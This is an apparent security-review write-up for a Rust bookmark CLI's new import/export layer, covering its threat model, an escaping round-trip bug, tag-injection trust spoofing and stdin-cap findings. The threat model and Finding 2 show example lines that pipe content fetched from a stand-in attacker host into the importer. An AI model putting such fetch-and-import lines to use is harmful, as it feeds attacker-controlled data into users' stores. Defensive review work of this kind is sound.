### Threat Model

**Plausible attackers** (Layer 3 additions in **bold**):

- **(a)** Co-tenant on shared Unix host with read access — unchanged from Layer 1. Mode 0600 + symlink-rejection mitigations apply to all Layer 3 writes.
- **(b)** Adversary-controlled `$BOOKMARK_CLI_DB` — unchanged from Layer 1. Symlink-rejection on both load and save applies to the import write side.
- **(c)** Adversary-supplied URL contents at render time — unchanged from Layer 1. `display_safe` at every render site.
- **(d)** Adversary-supplied argv bytes at clap-error render time — unchanged from Layer 1. `handle_parse_error` routes through `display_safe`.
- **(e)** Supply-chain adversary — unchanged. deny.toml + CI gates intact; no Layer 3 dependency additions.
- **(f) Adversary-supplied stdin to `bm import` — NEW at Layer 3.** Vectors: (i) user is socially-engineered to run `curl https://attacker.example/payload.json | bm import` (the canonical untrusted-pipeline shape); (ii) user pipes a corrupted file (`bm import < corrupted.json`); (iii) a wrapper script that constructs JSON from attacker-controlled inputs (e.g., a clipboard-import tool). The attacker controls EVERY byte of the import payload subject only to the 10 MB cap, the UTF-8 well-formedness check, the JSON parse, and the storage-format schema validation.

**Crown jewel** (Layer 3 additions in **bold**): the user's bookmark list (browsing-history-class, *confidential* per Dim 8) + the integrity of the operator's terminal session (URL render + tag render + clap-error render + **new pipeline-render surface from `bm export` stdout**) + **the integrity of the destination store's tag-as-trust-signal class** (per the RT R4 F6 / R5 F2 tag-injection-as-trust-signal threat-model paragraph at [DESIGN.md:301](../../DESIGN.md) — Layer 2 mitigated this via mode-0600+symlink-rejection foreclosure of write access; Layer 3 `bm import` re-introduces the write surface from a different vector).

**Entry points** (Layer 3 additions in **bold**): `<url>` positional to `bm add`; `<label>` positional to `bm tag`; `--tag <label>` flag to `bm list` / `bm export`; on-disk JSON store at `BookmarkStore::load`; argv to clap; **stdin pipe to `bm import` (NEW)**; **`--max-stdin-bytes <N>` flag to `bm import` (NEW — operator-controlled write-cap override)**.

**Relevant threat actors:** The Layer 3 `bm import` is the project's first surface where an attacker who does NOT have shell access to the user's account can still deliver attacker-controlled bytes — via a published JSON payload the user pipes in. The attacker model expands from "attacker has shell access" to "attacker has the ability to publish content the user pipes through `bm import`."

**Out of scope (per [DESIGN.md](../../DESIGN.md) § Threat model + § Edge case catalog):** same-user concurrent-process write race; unbounded URL length; TOCTOU between `path.exists()` and `read_to_string()` in `BookmarkStore::load` (single-process foreclosure); the 10 MB stdin-cap operator-override unbounded-memory risk (operator's own shell, ambient-authority pattern).

<a id="r1-f1"></a>**Finding 1 — `display_safe` at the `bm export` serialization boundary breaks the spec's `bm export | bm import` byte-preservation claim for pathological URLs (Dim 2, Dim 1)**

**Owner:** solution-owner
**Status:** raised
**Blocked by:** *(none)*

[DESIGN.md line 106](../../DESIGN.md) (§ `bm export` (Layer 3)) makes the following claim:

> "**Phase 2b implementation verification:** the implementation must confirm `display_safe`-wrapped strings remain JSON-valid (terminal escape sequences serialize as JSON-valid `` sequences so the round-trip `bm export | bm import` preserves the underlying bytes)."

The implementation at [`src/lib.rs:687-705`](../../src/lib.rs) escapes control / format characters via:

```rust
let _ = write!(out, "\\u{{{:04x}}}", c as u32);
```

— a **Rust-format escape** producing the 8-character literal sequence `\u{001b}` (backslash, `u`, open-brace, hex digits, close-brace). serde_json then serializes that 8-char string as the JSON literal `"\\u{001b}"`. JSON's actual `\uXXXX` escape (without braces) is what would round-trip the source byte; the Rust-style `\u{...}` form is NOT a JSON escape — JSON parsers (including serde_json's deserializer at `bm import` time) treat it as 8 literal characters.

**Concrete byte-trace of the round-trip:**

1. Source store: `{"url": "https://evil.example/[31mfrobnicate", ...}` (URL field contains 1-byte ESC + literal text).
2. `bm export` calls `display_safe(bm.url())` → `"https://evil.example/\u{001b}[31mfrobnicate"` (the ESC byte is replaced by 8 literal chars `\u{001b}`; total URL length grows by 7).
3. serde_json serializes the resulting string as `"https://evil.example/\\u{001b}[31mfrobnicate"` (the backslash is JSON-escaped to `\\`).
4. `bm import` deserializes that JSON string → URL field is the 8-char-extended literal `"https://evil.example/\u{001b}[31mfrobnicate"` (NOT the original 1-char-ESC form).
5. Destination store contains a URL field that is NOT byte-equal to the source.

The existing test [`tests_export_import_round_trip`](../../tests/bookmarks.rs#L1602) uses URLs without control chars (`https://item-0.example`, etc.), so it passes — the round-trip violation is **not test-covered**. The existing test [`tests_export_applies_display_safe_to_pathological_url`](../../tests/bookmarks.rs#L1236) asserts (a) no raw ESC in output, (b) output is JSON-valid, and (c) the URL field contains no raw ESC — it does NOT assert the byte-preservation round-trip. Both tests pass while the spec claim is silently violated.

**Why this is a Security finding, not a pure data-integrity finding:**

1. **Spec-violation on a security-relevant claim.** The spec at line 106 explicitly invokes round-trip byte-preservation as the verification target for the `display_safe`-at-export design choice. Security domain Dim 2 (persistence-data validation) covers any boundary where validated-vs-stored data shape drifts from spec; the export-import round trip IS a persistence boundary.
2. **"Store raw, sanitize at render" architectural-discipline violation.** [RT R1 F3 / RT R4 F3 carry-forward](2026-05-21-red-team.md#r4-f3) was closed at PR #46 with the framing "Layer 3 export path will render tag labels + URLs to stdout for downstream pipeline consumption; the existing `display_safe` sanitizer must apply at every Layer 3 export boundary that emits to a terminal-renderable surface." The implementation took the broader interpretation (sanitize the strings the serializer sees) rather than the narrower one (sanitize at the byte-emission boundary only, e.g., wrap stdout in a sanitizing Writer). The broader form is the one that violates the round-trip claim. RT R4 F3's amendment text matters: "the stored JSON is NOT sanitized" — the AMENDMENT closed at PR #46 says the **stored** JSON is unsanitized; the implementation in fact sanitizes the **exported** JSON's string values, producing a destination store with sanitized-escape-literals (not raw escape bytes) when re-imported. The destination store is therefore stored-sanitized — opposite to the spec's stated architectural choice.
3. **Defense-in-depth gain is real but spec-incoherent.** A reviewer could argue the implementation's behavior (sanitize-at-export-then-store-sanitized) is *more* defensive than the spec (store-raw, sanitize-at-render) because the destination store no longer carries live ESC bytes that a subsequent `bm list` would need to re-sanitize. That argument is valid as a design preference but it is not the design the spec describes; the spec needs to either match the implementation OR the implementation needs to change to match the spec.

**Reproducer (conceptual; sandbox forbids executing the binary in this session):**

```sh
# Source store with pathological URL containing a raw ESC byte:
printf '{"bookmarks":[{"url":"https://evil.example/\x1b[31mfrobnicate","timestamp":"2026-05-24T01:00:00Z","tags":[]}]}' > /tmp/src.json

# Export then import to a fresh destination:
BOOKMARK_CLI_DB=/tmp/src.json bm export | BOOKMARK_CLI_DB=/tmp/dst.json bm import

# Compare URL field bytes:
python3 -c "import json; print(repr(json.load(open('/tmp/src.json'))['bookmarks'][0]['url']))"
# Expected output (per spec line 106): 'https://evil.example/\x1b[31mfrobnicate'
python3 -c "import json; print(repr(json.load(open('/tmp/dst.json'))['bookmarks'][0]['url']))"
# Observed (per code analysis): 'https://evil.example/\\u{001b}[31mfrobnicate'
# Source URL is 33 bytes; destination URL is 40 bytes — NOT byte-preserving.
```

The reproducer was NOT run in-session because the sandbox forbids invoking the built binary; the byte-trace above is from code analysis of `display_safe` at [`src/lib.rs:687-705`](../../src/lib.rs) + the JSON serialization path. Red Team validation should run the binary directly to confirm the byte-divergence.

**Proposed disposition (two paths, SO adjudicates):**

- **Path A — spec amendment:** Amend [DESIGN.md line 106](../../DESIGN.md) to reflect the implementation's actual behavior: "`display_safe` wraps the URL + tag-label strings at the per-bookmark serialization step; this is the canonical sanitization-at-render-equivalent boundary per the RT R4 F3 carry-forward discipline. The round-trip `bm export | bm import` preserves bookmark records for URLs / tags that contain no `is_control()` or `is_format_char` bytes; for URLs / tags that DO contain such bytes, the round-trip stores the escaped literal form at the destination — the operator's terminal is safe regardless of which renderer the destination feeds, but byte-equality to the source store is NOT preserved." Amend the test [`tests_export_import_round_trip`](../../tests/bookmarks.rs#L1602) to include a pathological-URL case asserting the escape-literal preservation (not raw-byte preservation).

- **Path B — code change to match spec:** Move `display_safe` from the per-string-value-at-serialize boundary into the stdout-write boundary — wrap stdout in a `display_safe`-applying Writer at the `print!("{json}")` call site in `run_export` ([`src/main.rs:414`](../../src/main.rs)). The stored JSON string values become byte-equal to the source; the rendered stdout bytes are still escape-clean for terminal consumers. The round-trip `bm export | bm import` preserves source bytes because the import-side parser sees the JSON-escape-form (``) which deserializes to the original ESC byte. The trade-off: complexity moves from `export_json` (pure) to `run_export` (effectful); the existing test asserting no-raw-ESC-in-stdout passes either way; a new test asserting source-byte preservation across the round-trip is added.

**Recommended path (Security perspective):** Path A. Path A names the implementation's existing defense-in-depth gain explicitly; Path B re-introduces live ESC bytes into the destination store that a subsequent `bm list` must re-sanitize (correctness depends on the render-time `display_safe` discipline holding). The cost-asymmetry favors Path A: a 2-sentence spec amendment + one test assertion vs. a Writer-wrapping refactor whose correctness depends on a future maintainer not forgetting the wrap. Path A also closes RT R4 F3's "stored JSON is NOT sanitized" amendment language (which became inaccurate when the implementation diverged from it).

**Classification:** Raised to SO. The defect is at the DESIGN.md / implementation interface; only the Solution Owner has DESIGN.md change authority per the Security domain prompt. The risk-owner-pending-fix attribution is solution-owner; Security routes the decision and re-validates whichever path SO chooses.

<a id="r1-f2"></a>**Finding 2 — Tag-injection-as-trust-signal threat class extends to stdin-fed `bm import` but DESIGN.md § Threat model addition does not name the extension (Dim 1, Dim 8)**

**Owner:** security
**Status:** raised
**Blocked by:** *(none)*

The Layer 2 threat-model paragraph at [DESIGN.md:301](../../DESIGN.md) names the **tag-injection-as-trust-signal** class:

> "an adversary with write access to the storage file (the same vector as Adversary-controlled `$BOOKMARK_CLI_DB` above) can fabricate tags like `["verified", "approved"]` on user-trusted bookmarks, creating a misleading trust-signal that the user might interpret as their own past-tagging."

The Layer 2 mitigation: mode 0600 + symlink-rejection prevent write access to the storage file; the attacker class is bounded by "the attacker already has more leverage than tag injection — they can also rewrite URLs, fabricate entire bookmark records, or replace the whole file." Documented as **accepted risk** because the write-access precondition already grants strictly greater leverage.

The Layer 3 spec's threat-model addition at [DESIGN.md:130](../../DESIGN.md) extends the threat model for the stdin attack surface, but covers only TWO dimensions:

> "Existing defenses apply: serde_json default 128-level recursion limit defends against JSON depth-bomb [...]; display_safe applies at the rendering boundary if imported bookmarks are subsequently rendered via `bm list`. New defenses for the stdin attack surface: **(a)** the 10 MB input-size cap above [...]; **(b)** import-from-attacker-controlled-stdin per the Layer 1 threat-model framing on adversary-supplied URL contents — same disposition: store the bytes as-given; defer rendering safety to the `display_safe` discipline at output time."

**The gap:** Layer 3 `bm import` introduces a NEW vector for tag injection that the Layer 2 paragraph's "write-access precondition grants strictly greater leverage" argument does NOT cover. An attacker who can supply the import payload (vector: user pipes attacker-published JSON via `curl ... | bm import`; clipboard-paste tool; wrapper script) gets the tag-injection primitive WITHOUT first needing write access to the storage file. The attacker's leverage is bounded only by what `import_json` will accept — which is any well-formed JSON with valid `url` + `timestamp` + `tags` fields. The attacker can fabricate tags like `["verified", "approved", "reviewed-by-user"]` on bookmarks they construct (or on bookmarks they prepend to legitimate exported payloads).

**Why this is NOT subsumed by the Layer 2 disposition:**

- Layer 2: attacker needs write access → already has greater leverage (can rewrite URLs, etc.) → tag-injection is a strict subset of an already-accepted-risk class.
- Layer 3: attacker needs only the ability to publish content the user pipes in → does NOT have arbitrary-file-write leverage on the user's account → tag-injection is the PRIMARY attack primitive available to this attacker class, not a secondary consequence.

The "store the bytes as-given; defer rendering safety to display_safe at output time" disposition in DESIGN.md line 130 addresses the **rendering** dimension (which `bm list` would sanitize anyway) but does NOT address the **trust-signal** dimension (the user querying `bm list --tag verified` will see attacker-fabricated bookmarks alongside legitimately-self-tagged ones with no distinguishing signal). The user's own audit trail (the tags they remember adding) is no longer authoritative once an attacker-supplied import has run.

**Concrete attack scenario (conceptual; reproducer left to Red Team validation):**

1. Attacker publishes `https://attacker.example/cool-rust-bookmarks.json` containing legitimate-looking bookmarks (real URLs, plausible timestamps) **tagged with `["verified", "approved", "reviewed"]` and other user-trust-signal labels**.
2. User runs `curl https://attacker.example/cool-rust-bookmarks.json | bm import` thinking they're importing a curated bookmark collection.
3. Destination store now contains attacker bookmarks with attacker-controlled tag labels.
4. User later runs `bm list --tag verified` expecting to see THEIR OWN past-verified bookmarks; attacker bookmarks surface alongside genuine ones with no distinguishing signal. The user clicks one. (`bm list` rendering doesn't open URLs but the user's downstream workflow — copy URL → paste in browser — is where the harm materializes.)

The attack succeeds without compromising the user's account, without writing to the storage file directly, without bypassing the mode-0600 control, and without bypassing the symlink-rejection. The Layer 2 mitigation chain is intact and does not foreclose this attack.

**Proposed disposition:**

- **Path A — spec amendment (Raised to SO):** Extend [DESIGN.md:130](../../DESIGN.md) to name the tag-injection class explicitly for the stdin vector. Proposed amendment text: *"**Tag-injection-as-trust-signal via stdin** (Layer 3 extension of the Layer 2 Adversary-supplied URL contents threat). The Layer 2 disposition documented at line 301 was that the write-access-precondition attacker has strictly greater leverage; the Layer 3 stdin attacker does NOT have that precondition, so tag-injection becomes the primary attack primitive for the stdin attacker class. Disposition: store the bytes as-given (consistent with the Layer 1 URL-content disposition); document this surface as an **accepted risk for the operator** who chooses to pipe attacker-supplied JSON through `bm import`. The mitigation the operator applies is workflow-level (verify the source of imported payloads; do not pipe untrusted curl-fetched JSON). The application does not validate that tag-labels are operator-authored vs. import-supplied — operators who need that distinction should maintain separate stores per import-source."*
- **Path B — code change:** Prefix imported tags with a provenance marker (e.g., `imported:verified` instead of `verified`) so the user can distinguish self-authored from import-supplied tags. This is a substantive UX / data-model change that affects the round-trip invariant; out of scope for a Security finding to mandate. Mentioned for completeness.
- **Path C — accepted risk:** Classify as **Accepted risk** per the Security four-class universe, with the **operator** named as the risk owner (the user piping attacker-supplied JSON accepts the trust-signal-fabrication surface).

**Recommended path (Security perspective):** Path A + Path C combined — amend the spec to name the surface, then classify the surface as Accepted risk with the operator as the risk owner. The spec amendment is the audit-trail closure; the classification is the disposition.

**Classification:** Raised to SO. The amendment is documentation-level (proposed text supplied above); the eventual disposition path is **Accepted risk** with the **operator** named as the substantive risk owner — but the spec amendment must land first so the audit trail names the surface before the disposition is recorded. Re-classification to Accepted risk in Round 2 once the spec amendment lands.

<a id="r1-f3"></a>**Finding 3 — Layer 3 spec does not extend the confidential data classification posture to stdin-supplied tag bytes (Dim 8)**

**Owner:** security
**Status:** raised
**Blocked by:** *(none)*

[DESIGN.md § Storage data classification](../../DESIGN.md) (lines 314–322) names the `tags` field as confidential-class data per the Layer 2 R4 F1 / R5 F1 spec amendment:

> "The per-bookmark `tags: Vec<String>` field is also **confidential**-class — what someone tags their reading with is at least as sensitive as the URLs themselves [...] The mode-0600 + symlink-rejection mitigations established for URLs apply uniformly to the `tags` field — the on-disk file is one confidential-class artifact; there is no per-field permission split."

The Layer 3 spec extension at [DESIGN.md:130](../../DESIGN.md) (threat-model addition for stdin-fed input) is silent on the **provenance** of tag bytes that enter the store via `bm import`. The data-classification posture says "tags = confidential" but does not name that **import-supplied tags become confidential-class data at the destination store as soon as the import write completes**, nor that **the operator who pipes attacker-supplied tags into their store has authorized that data to be classified at the destination's confidentiality tier**. This is a Dim 8 audit-trail completeness gap — the same shape as R4 F1's gap on the `tags` field itself (the on-disk control was uniform; the spec-level classification statement was incomplete).

The gap matters for two reasons:

1. **Forward-readiness for a future "remove imported tags" or "purge by provenance" operation.** If a future Layer 4 adds a `bm purge --imported-tag <label>` operation to recover from a malicious-import event, the spec needs an authoritative statement of what "imported tag" means and how the destination's data-classification posture applies to mixed-provenance data. The current spec has no such statement.
2. **Confidentiality-aware reasoning for cross-store imports.** A user who exports from a *personal* store (containing personal-confidential tags) and imports into a *shared-machine* store inherits the confidentiality tier of the source's tags into the destination. The spec's silent treatment means the user has no spec-anchored basis to reason about whether the cross-store import maintains the confidentiality posture.

**Proposed disposition:** Raised to SO for a spec amendment. Suggested text (3 sentences for § Storage data classification or § Threat model):

> **Imported-tag classification (Layer 3).** Tags entering the store via `bm import` inherit the *confidential* classification tier of the destination store regardless of the source's classification posture. The destination's mode-0600 + symlink-rejection mitigations apply uniformly to imported bytes at write time. An operator who pipes attacker-supplied JSON through `bm import` has authorized those bytes to be classified at the destination's confidentiality tier; cross-store imports that move bytes between stores of different confidentiality tiers are the operator's responsibility to validate.

**Classification:** Raised to SO. The amendment is documentation-only (no code change); the on-disk control is already uniform.

<a id="r1-f4"></a>**Finding 4 — `serde_json::from_str` 128-level recursion limit on `bm import` re-evaluation: protection still holds at Layer 3 but the disposition basis shifts from "no attacker write access" to "default-limit-plus-cap-bounded" (Dim 2)**

**Owner:** security
**Status:** raised
**Blocked by:** *(none)*

[Security Review 1 Finding 6](2026-05-20-security.md#r1-f6) (verified at R2 F7 / R3 F7) classified the serde_json depth-bomb concern as **Hallucinated** on two grounds: (a) the attacker model does not grant write access to the storage file; (b) serde_json's default 128-level recursion limit produces a graceful parse error rather than a stack overflow. R1 F6's own prose named the re-activation trigger explicitly:

> "If a future layer adds an `bm import` command that reads JSON from stdin or an untrusted URL, this dimension re-activates and is no longer hallucinated; flag for re-evaluation at Layer 3 (per [`DESIGN.md`](../../DESIGN.md) § Scope and non-goals "`bm import` — read bookmarks from stdin" deferred to Layer 3)."

**The trigger has fired.** Layer 3 `bm import` consumes attacker-supplied JSON from stdin. Leg (a) of the Hallucination determination is no longer applicable — the attacker DOES have a write surface (write to stdin, not directly to the file, but the import-then-save flow ultimately writes the attacker-influenced bytes to the destination).

**Re-evaluation of leg (b); the protection still holds, with two stacked defenses:**

1. **serde_json 128-level recursion limit (unchanged from Layer 1).** [`Cargo.lock`](../../Cargo.lock) confirms `serde_json = 1.0.149`; the default `Deserializer::recursion_limit` is unchanged at 128. A payload deeper than 128 levels surfaces as `ImportError::InvalidJson(detail)` per [`src/lib.rs:518-519`](../../src/lib.rs) → exit 1 (graceful failure, no process abort). Verified in code: `serde_json::from_str(payload)` uses the default Deserializer with no `disable_recursion_limit()` call.
2. **10 MB stdin-cap as a structural depth bound (NEW at Layer 3).** Even if leg (1) were defeated (e.g., a future `serde_json` version with a higher default), the 10 MB cap on stdin payload size bounds the maximum depth-bomb size. A pure-nesting payload of `[[[[...]]]]` consumes 2 bytes per depth level; the 10 MB cap permits at most ~5M-level depth. With the 128-level serde_json limit active, the parse fails at depth 128 long before either the cap OR the available stack runs out. The cap is the second wall.

**Why this is `Accepted risk` not `Hallucinated` this round:**

R1 F6 / R2 F7 / R3 F7 classified Hallucinated on a basis that no longer applies — the no-attacker-write-access leg. The new basis (serde_json limit + cap) is materially different and deserves explicit affirmative treatment, not silent carry-forward of the Hallucinated determination. A finding that classifies a surface as protected by Layer-3-specific mitigations is `Accepted risk` (the risk is real; the mitigations are explicit; the owner accepts the residual surface), not `Hallucinated` (the surface is not real). The Hallucinated classification fits when the threat itself is invented; here the threat is real and the mitigations are real, which is `Accepted risk` per the Security four-class universe.

**Test coverage gap (coordinated to QE, not a Security finding):** there is no Red Gate test asserting that `bm import` rejects a deeply-nested JSON payload with a graceful parse error (vs. process abort). The protection is structurally in place but not regression-tested. Flag to [Quality Engineer Layer 3](../QUALITY-ENGINEER-REVIEW.md) for the test addition; the test surface is: feed `bm import` a payload with 200 levels of array nesting, assert exit 1 + `Error: stdin is not valid JSON.` stderr message.

**Classification:** Accepted risk. **Risk owner:** solution-owner (the project author accepts the residual depth-bomb surface as adequately mitigated by serde_json's default limit + the 10 MB cap). The disposition is forward-evaluable: if a future layer raises the stdin cap to a value where deep-nesting via a permissive future serde_json version becomes feasible, this finding re-activates.

<a id="r1-f5"></a>**Finding 5 — `--max-stdin-bytes <N>` flag is an operator-controlled write-cap override; an operator who sets `N = usize::MAX` effectively defeats the size cap (Dim 1)**

**Owner:** solution-owner
**Status:** raised
**Blocked by:** *(none)*

[`src/main.rs:167-168`](../../src/main.rs) declares the `--max-stdin-bytes` flag:

```rust
#[arg(long = "max-stdin-bytes", default_value_t = MAX_STDIN_BYTES_DEFAULT)]
max_stdin_bytes: usize,
```

[`src/main.rs:424-427`](../../src/main.rs) reads stdin with the cap applied:

```rust
let mut bytes = Vec::new();
let cap_plus_one = u64::try_from(max_stdin_bytes)
    .unwrap_or(u64::MAX)
    .saturating_add(1);
if let Err(e) = std::io::stdin().take(cap_plus_one).read_to_end(&mut bytes) {
```

The `saturating_add(1)` on `u64::MAX` yields `u64::MAX`; `Read::take(u64::MAX)` is effectively unbounded; the subsequent `bytes.len() > max_stdin_bytes` check where `max_stdin_bytes == usize::MAX` is "len > usize::MAX" which is impossible for any in-memory `Vec<u8>`. The size-cap protection is therefore **defeasible by the operator** via `bm import --max-stdin-bytes <large-value>` — at large enough values the cap is effectively absent and the import flow is bounded only by available memory.

**Why this is Accepted risk, not Open:**

The pattern matches the Layer 1 R1 F4 / R2 F5 / R3 F5 `$BOOKMARK_CLI_DB` ambient-authority disposition exactly: the operator controls their own shell; the operator's shell is the access boundary; the operator who explicitly disables a protection has authorized the surface that protection covered. The 10 MB default is the design-time floor; the `--max-stdin-bytes` flag is the explicit operator escape hatch. DESIGN.md line 128 already names this:

> "Default cap: 10 MB (matches the project's existing scale ceiling of 10,000 bookmarks at ~1 KB each). Operator override via `--max-stdin-bytes <N>` flag."

The spec explicitly enables the override; the finding is the audit-trail acknowledgment that the override semantics include the all-bets-off case. The threat model's existing ambient-authority disposition covers this — Security raises it as **Accepted risk** so the audit trail names the surface explicitly rather than absorbing it silently into the operator's responsibility.

**Adjacent observation (not a separate finding):** the `usize::MAX` corner case is platform-dependent (32-bit vs. 64-bit). On a 32-bit platform `usize::MAX` is 4 GiB, which is reachable via `Vec<u8>` allocation if the process address space allows. On 64-bit `usize::MAX` is unreachable because no realistic stdin stream contains 16 EiB. The platform-dependent corner case does not change the disposition.

**Classification:** Accepted risk. **Risk owner:** solution-owner (per the env-var ambient-authority precedent — operator controls their own shell and own flags). The cost of a defensive cap on `--max-stdin-bytes` (e.g., reject values > 100 MB) is the operator who has a legitimate 200 MB import has to chunk their workflow; the benefit is a small additional safety margin for operators who fat-finger a large value. The Layer 3 spec chose the operator-trust path; Security preserves the choice with the risk-owner named.

### Hallucinated

<a id="r1-f6"></a>**Finding 6 — `String::from_utf8(bytes)` at the stdin-cap boundary creates a UTF-8-split-byte information-leakage oracle when the cap falls mid-multi-byte-sequence**

**Owner:** security
**Status:** raised
**Blocked by:** *(none)*
**Validator:** sanity-check

A reviewer's first instinct on seeing [`src/main.rs:443-449`](../../src/main.rs) might be: when stdin is exactly cap-bytes long and the cap-th byte happens to fall in the middle of a multi-byte UTF-8 sequence, `String::from_utf8(bytes)` fails with `FromUtf8Error` and the implementation routes through:

```rust
let Ok(payload) = String::from_utf8(bytes) else {
    eprintln!("Error: stdin is not valid JSON.");
    eprintln!("(stdin is not valid UTF-8)");
    return ExitCode::from(1);
};
```

An attacker who controls stdin could observe which exit-code-vs-error-string-pair the binary produces and use the timing / output to distinguish "exactly cap bytes + boundary falls on UTF-8 split" from "exactly cap bytes + boundary falls on character boundary." A side-channel oracle on the cap-byte position would let the attacker probe what the cap is set to.

**Specific demonstration of why the concern does not apply (per Phase 3 primer's hallucinated-finding discipline):**

1. **The attacker already knows the cap.** The cap is named in two places the attacker can read directly: (a) DESIGN.md line 128 publishes "Default cap: 10 MB"; (b) the error message at `bm import` rejection time emits `Error: stdin exceeded maximum byte limit of <N>.` ([`src/main.rs:436`](../../src/main.rs)) which echoes the operator's `--max-stdin-bytes` value verbatim. There is no information the oracle could leak that is not already free.
2. **The cap is per-invocation, not per-secret.** The cap value is operator-set, not a secret. There is no confidentiality interest in the cap's value; even if the oracle were exploitable, what it leaks is not confidential data.
3. **The UTF-8 boundary failure mode is a graceful exit-1, not a process abort.** The implementation handles the failure with the spec-contracted error message; no stack corruption, no memory disclosure, no use-after-free. The failure mode is the same as any other malformed-input error.

The finding does not represent a control gap because the "information" the oracle would leak (the cap value) is freely advertised, and the failure mode is graceful by design. The concern is structurally adjacent to a real oracle class (UTF-8 boundary timing in network protocols) but the specific application context — operator-set, freely-published cap — eliminates the secrecy precondition for the oracle to be useful.

**Classification:** Hallucinated. Validator is `sanity-check` per the Security domain prompt's validator-pair convention — there is no Red Team validation surface for a Hallucinated finding (no fix to test, no exploit to demonstrate). The finding is recorded so a future reviewer who re-discovers the surface sees the prior reasoning chain rather than re-raising the same hallucination.
